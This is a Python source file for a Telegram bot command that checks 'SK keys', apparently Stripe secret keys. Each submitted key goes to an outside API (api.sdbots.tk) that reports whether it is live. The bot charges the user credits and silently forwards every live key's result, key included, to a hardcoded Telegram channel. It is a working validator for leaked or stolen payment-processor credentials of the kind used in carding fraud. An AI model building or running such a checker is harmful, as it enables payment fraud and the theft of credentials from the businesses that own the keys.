# SK KEY CHECKING COMMAND
import time
from pyrogram import Client
import requests
from requests.exceptions import ProxyError
import re
import bs4
from values import *
from pyrogram import Client, filters
import json

@Client.on_message(filters.command(["sk", "key"], prefixes=[".", "/", "!"], case_sensitive=False) & filters.text)
async def sk(Client, message):
  try:
    if (str(message.chat.id) + "\n" not in verified_gps and message.chat.type != "private"):
      await message.reply_text(text="""<b>⚠️ Unauthorized Group ⚠️</b>""",reply_to_message_id=message.message_id)
    else:    
      key = message.text.split(None, 1)[1]
      find = maindb.find_one({"_id": message.from_user.id})
      credits = int(find['credits'])
      text = f"""
<b>🔄 CHECKING YOUR SK........

✘ KEY: <code>{key}</code>
✘ CHECKING BY: <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]
✘  POWERED BY : S P A R K Y </b>
"""      
      msg = await message.reply_text(text=text, reply_to_message_id=message.message_id)
      req = requests.get(f"https://api.sdbots.tk/sk?key={key}").json()
      response = req['response']
      sk_key = req['sk_key']
      status = req['status']
      if status == "Dead ✕":
        credits_left = credits - 2
        maindb.update_one({'_id': message.from_user.id},{'$set': {'credits': credits_left}}, upsert=False)
        text = f"""
<b>❇️ [SK KEY CHECKER] ❇️

✘ STATUS : DEAD KEY ❌️
✘ KEY : <code>{sk_key}</code>
✘ RESPONSE : <code>{response}</code>
┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ 
✘ CREDITS LEFT: {credits_left} Credits

✘ CHECKED BY : <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]
✘ POWERED BY : S P A R K Y</b>"""     
        msg = await msg.edit(text) 
      else:
        credits_left = credits - 2
        maindb.update_one({'_id': message.from_user.id},{'$set': {'credits': credits_left}}, upsert=False)        
        text = f"""
<b>❇️ [SK KEY CHECKER] ❇️

✘ STATUS : LIVE KEY ✅️
✘ KEY : <code>{sk_key}</code>
✘ RESPONSE : <code>{response}</code>
┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ 
✘ CREDITS LEFT : <code>{credits_left} Credits </code>

✘ CHECKED BY : <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]
✘ POWERED BY : S P A R K Y</b>"""
        msg = await msg.edit(text) 
        await Client.send_message(-1001752921824, text)
  except Exception as e:
    await Client.send_message(chat_id=loggp, text=e)
